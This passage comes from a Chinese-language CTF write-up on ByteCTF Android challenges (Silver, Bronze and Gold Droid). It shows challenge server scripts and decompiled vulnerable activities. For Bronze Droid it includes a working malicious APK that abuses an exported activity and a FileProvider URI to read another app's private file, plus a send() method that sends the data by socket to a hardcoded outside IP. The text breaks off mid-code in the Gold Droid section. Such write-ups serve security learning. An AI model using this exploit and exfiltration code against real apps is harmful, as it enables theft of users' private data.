    adb(["wait-for-device"])
    adb_install(APK_FILE) #将apk文件装到模拟器中
    with open(FLAG_FILE, "r") as f: 
        adb_broadcast(f"com.wuhengctf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})
    #adb shell su root am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}' 
    #am broadcast 发送广播
    #-a com.wuhengctf.SET_FLAG:指定intent操作，如android.intent.action.VIEW,Intent intent = new Intent();  intent.setAction("android.SET_FLAG");
    #-n "com.bytectf.silverdroid/.FlagReceiver": 确定接收者
    #-e 'flag' 'flag{eeeeeeee}': 字符串
    adb_activity(f"{VULER}/.MainActivity", wait=True, data=url)
    # adb shell am start -W -n "com.bytectf.silverdroid/.MainActivity" -d "url"
    #-n "com.bytectf.silverdroid/.MainActivity":启动MainActivity
    #-d "url":传递url给MainActivity，而silver droid程序通过Uri uri0 = this.getIntent().getData()接收url
    print_to_user("Launching! Let your apk fly for a while...\n")
    if isMacos:
        input('wait for debug')
    else:
        time.sleep(EXPLOIT_TIME_SECS)
    print_to_user("exiting......")
    try:
        os.killpg(os.getpgid(emulator.pid), signal.SIGTERM)
        os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)
    except:
        pass
## 2.MainActivity逆向
使用jeb打开apk，MainActivity如下
    package com.bytectf.silverdroid;
    import android.net.Uri;
    import android.os.Bundle;
    import android.util.Log;
    import android.webkit.WebResourceRequest;
    import android.webkit.WebResourceResponse;
    import android.webkit.WebView;
    import android.webkit.WebViewClient;
    import androidx.appcompat.app.AppCompatActivity;
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.util.HashMap;
    public class MainActivity extends AppCompatActivity {
        @Override  // androidx.fragment.app.FragmentActivity
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            this.setContentView(0x7F0B001C);  // layout:activity_main
            Uri uri0 = this.getIntent().getData(); //获得intent所传过来的data参数，可以来自另一个app
            if(uri0 != null) {   //若参数不为null
                WebView webView = new WebView(this.getApplicationContext());//新建的页面取得是整个app的context
                webView.setWebViewClient(new WebViewClient() { //当从一个网页跳转到另外一个网页时，我们希望目标网页仍然在当前的webview中显示，而不是在浏览器中打开
                    @Override  // android.webkit.WebViewClient
                    public boolean shouldOverrideUrlLoading(WebView view, String url) {
                      //当shouldOverrideUrlLoading返回值为true，拦截webview加载url
                        try {
                            Uri uri0 = Uri.parse(url); //解析url
                            Log.e("Hint", "Try to upload your poc on free COS: https://cloud.tencent.com/document/product/436/6240");
                            if(uri0.getScheme().equals("https")) { //scheme必须是https
                                return !uri0.getHost().endsWith(".myqcloud.com");//若是以.myqcloud.com结尾，返回true，再取反返回false，不会拦截webview加载url
                            }
                        }
                        catch(Exception e) {
                            e.printStackTrace();
                            return true;
                        }
                        return true;
                    }
                });
                webView.setWebViewClient(new WebViewClient() {
                    @Override  // android.webkit.WebViewClient
                    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {  //拦截url，js，css等响应阶段,拦截所有的url请求，若返回非空，则不再进行网络资源请求，而是使用返回的资源数据 
                        FileInputStream inputStream; 
                        Uri uri0 = request.getUrl();  //获得js请求的request  
                        if(uri0.getPath().startsWith("/local_cache/")) { //检查域名后的path是否为/local_cache/开头
                            File cacheFile = new File(MainActivity.this.getCacheDir(), uri0.getLastPathSegment()); //只是在内存中创建File文件映射对象,而并不会在硬盘中创建文件，新建file以cache为目录，uri0的最后一个地址段
                          //getCacheDir获取手机中/data/data/包名/cache目录；
                            if(cacheFile.exists()) { //若映射的文件真实存在，则进入下面循环
                                try {
                                    inputStream = new FileInputStream(cacheFile);//其将文件内容读取到了内存inputStream内，之后可以进行读取操作
                                }
                                catch(IOException e) {
                                    return null;
                                }
                                HashMap headers = new HashMap();
                                headers.put("Access-Control-Allow-Origin", "*");
                                return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream);  //返回响应
                            }
                        }
                        return super.shouldInterceptRequest(view, request);
                    }
                });
                this.setContentView(webView); //
                webView.getSettings().setJavaScriptEnabled(true); //设置WebView属性，能够执行Javascript脚本
                webView.loadUrl("https://bytectf-1303079954.cos.ap-nanjing.myqcloud.com/jump.html?url=" + uri0);
            } 
        }
    }
经过分析可知，MainActivity先loadUrl，从判断传入的intent是否符合https开头，以.myqcloud.com结尾，若符合；在请求js脚本的内容时会拦截其响应，对js脚本的response地址进行检查，则返回响应时修改响应数据。
## 3.jump.html
主要功能就是提供一个检查并且打开传入的url地址
    jump
        function getQueryVariable(variable)
        {
            var query = window.location.search.substring(1); //window.location是获得当前页面的url地址，添上search之后表示从"?"开始的url，而substring(1)就是将"?"截掉。
            var vars = query.split("&");  //把query以"&"进行分割
            for (var i=0;i 1 && myurl.indexOf("myqcloud")==-1) { //myurl不能含有myqcloud
            window.location.href = myurl;  //只表示打开这个url页面，并不是打开且刷新这个页面
        }
## 4.漏洞利用（不完整）
经过分析得知我们传入的poc必须以"https"开头，在webview中处理时以"myqcloud.com"结尾，但是在jump.html跳转页面时不包含myqcloud，需要用到字符转换之类.
由于是赛后复现，观察其他师傅的wp发现，我们js脚本中的请求url必须包含有flag文件，我自己也尝试过在几个服务器内部部署一个flag文件，可能是由于docker启动的问题，导致网络不稳定，一直请求不到
将此js文件放到
# 四：Bronze Droid
## 1.server.py分析
打开apk之前，先大概看了一眼docker和启动环境的脚本，和Silver
Droid的大致一样，其中server.py的实现便不同，大致便是由攻击者实现一个恶意apk，将题目提供的apk和自己实现的apk均安装到模拟器内，启动恶意apk的MainActivity来获得flag
由于篇幅，下面server.py代码仅复制与上面不一样的地方
    print_to_user("Please enter your apk url:")
    url = sys.stdin.readline().strip()
    EXP_FILE = download_file(url) 
    if not check_apk(EXP_FILE):
        print_to_user("Invalid apk file.\n")
        exit(-1)
    print_to_user("Preparing android emulator. This may takes about 2 minutes...\n")
    emulator = setup_emulator()
    adb(["wait-for-device"])
    adb_install(APK_FILE)   #安装受害者apk
    with open(FLAG_FILE, "r") as f:
        adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})
    time.sleep(3)
    adb_install(EXP_FILE)  #安装恶意apk
    adb_activity(f"{ATTACKER}/.MainActivity") #启动恶意apk的MainActivity
    print_to_user("Launching! Let your apk fly for a while...\n")
## 2.MainActivity逆向
看代码如下，一眼看去好短；
    package com.bytectf.bronzedroid;
    import android.app.Activity;
    import android.os.Bundle;
    public class MainActivity extends Activity {
        @Override  // android.app.Activity
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            this.setContentView(0x7F0B001C);  // layout:activity_main
            String s = this.getIntent().getAction(); //获得启动该Activity的intent的Action属性
            if(s != null && (s.equals("ACTION_SHARET_TO_ME"))) { //判断
                this.setResult(-1, this.getIntent()); //将某些数据回带给启动该Activity的Activity
                this.finish();
            }
        }
    }
MainActivity的exported属性为true，所以可以通过外部app来启动MainActivity，具体利用思路可以是编写的恶意apk自带uri来访问受害者apk的flag文件，然后受害者app通过setResult将flag回带给恶意apk。
想要读取flag文件，需要利用fileprovider，可知authority是com.bytectf.bronzedroid.fileprovider，所以intent的data为content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag
## 3.漏洞利用
恶意apk的MainActivity如下，下面的MainActivity可以进行本地测试；如果打远程需要将flag通过http回传到服务器。
    package com.eeeetest.bronzedroid_pwn;
    import androidx.appcompat.app.AppCompatActivity;
    import android.content.Intent;
    import android.net.Uri;
    import android.os.Bundle;
    import android.util.Log;
    import android.widget.TextView;
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.io.OutputStream;
    import java.net.HttpURLConnection;
    import java.net.Socket;
    import java.net.URL;
    public class MainActivity extends AppCompatActivity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            Intent intent = new Intent();
            intent.setAction("ACTION_SHARET_TO_ME");
            intent.setClassName("com.bytectf.bronzedroid","com.bytectf.bronzedroid.MainActivity");
            intent.setData(Uri.parse("content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag"));
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            startActivityForResult(intent,1);
        }
        @Override //重写
        public void onActivityResult(int requestCode, int resultCode, Intent data) { //得到回传的数据
            super.onActivityResult(requestCode, resultCode, data); //重写
            try {
                InputStreamReader inputStreamReader = new InputStreamReader(getContentResolver().openInputStream(data.getData()));
                char[] cArr = new char[1024];
                StringBuffer stringBuffer = new StringBuffer("");
                while (-1 != inputStreamReader.read(cArr, 0, 1024)) {
                    stringBuffer.append(String.valueOf(cArr));
                }
                //send(new String(stringBuffer));
                String flag = new String(stringBuffer);
                ((TextView) findViewById(R.id.tv_show)).setText(new String(stringBuffer));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        }
若想回传flag，只需要在恶意apk内增加一个httpGet功能，然后在服务器内监听一下，代码如下
    private void send(final String str) { //和服务器建立socket通信，将flag带入到服务器内
            new Thread() {
                @Override
                public void run() {
                    try {
                        Socket socket = new Socket("47.101.67.103", 1235); 
                        sleep(1000L);
                        if (socket.isConnected()) {
                            System.out.println("connect succeed!");
                            OutputStream outputStream = socket.getOutputStream();
                            outputStream.write(str.getBytes());
                            outputStream.flush();
                            outputStream.close();
                            socket.close();
                        }
                    } catch (Exception unused) {
                    }
                }
            }.start();
        }
# 五：Gold Droid
## 1.server.py
和前两题又不一样，这题先运行了受害apk的main，然后再运行恶意apk的main来拿到flag
    print_to_user("Please enter your apk url:")
    url = sys.stdin.readline().strip()
    EXP_FILE = download_file(url)
    if not check_apk(EXP_FILE):
        print_to_user("Invalid apk file.\n")
        exit(-1)
    print_to_user("Preparing android emulator. This may takes about 2 minutes...\n")
    emulator = setup_emulator()
    adb(["wait-for-device"])
    adb_install(APK_FILE)   #安装受害apk
    adb_activity(f"{VULER}/.MainActivity")  ######  启动受害apk的MainActivity
    with open(FLAG_FILE, "r") as f:
        adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()}) #发送flag
    time.sleep(3)
    adb_install(EXP_FILE)
    adb_activity(f"{ATTACKER}/.MainActivity")  #运行恶意apk的MainActivity
    print_to_user("Launching! Let your apk fly for a while...\n")
    if isMacos:
        input('wait for debug')
    else:
        time.sleep(EXPLOIT_TIME_SECS)
    print_to_user("exiting......")
## 2.MainActivity逆向
代码看起来没有什么漏洞，只是创建了一个文件并向内部写入" I\'m in external"
    package com.bytectf.golddroid;
    import android.os.Bundle;
    import androidx.appcompat.app.AppCompatActivity;
    import java.io.File;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.nio.charset.StandardCharsets;
    public class MainActivity extends AppCompatActivity {
        @Override  // androidx.fragment.app.FragmentActivity
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            this.setContentView(0x7F0B001C);  // layout:activity_main
            File externalFile = new File(this.getExternalFilesDir("sandbox"), "file1"); //getExternalFilesDir对应的目录是/sdcard/Android/data/包名/files/，映射sandbox文件夹内的file1文件
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(externalFile); //创建externalFile文件